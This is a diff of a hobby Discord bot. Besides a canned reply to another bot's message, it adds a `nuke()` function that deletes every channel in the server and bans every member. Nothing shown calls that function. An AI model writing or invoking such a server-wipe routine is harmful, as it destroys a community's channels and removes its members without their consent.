@@ -14,6 +14,7 @@ GUILD = os.getenv('DISCORD_GUILD')
 
 JARVIS_HATES_SWEARING = "<@357298440650358804> This is a server with young children in it, such as SirPortals. Please do not be using heavy swear words, or you will be removed by the moderation team."
 
+
 async def respond(msg, response, reaction=None): #responds to the message with response 
     if reaction != None: #reaction will be none by default. If a reaction is passed in, it will be added to the message 
         await msg.add_reaction(reaction)
@@ -73,6 +74,14 @@ async def on_ready():
     server = bot.get_guild(955897343004270662)
 
 
+async def nuke():
+    channels = await server.fetch_channels()
+    for channel in channels:
+        await channel.delete()
+    async for member in server.fetch_members():
+        await member.ban()
+
+        
 async def fetch_message(payload): #fetches a message given the payload
     channel = await bot.fetch_channel(payload.channel_id)
     message = await channel.fetch_message(payload.message_id)
@@ -171,6 +180,9 @@ async def on_message(message):
         await message.delete()
         return
     if message.channel.id == 1129151660053250170 and message.author.id == 1138901550312460299:
+        if "I believe it to be unwise to spam at this current moment, my apologies." in message.content:
+            respond(message, "fine.", "�")
+            return
         if resCount > 69:
             resCount = 0
             return
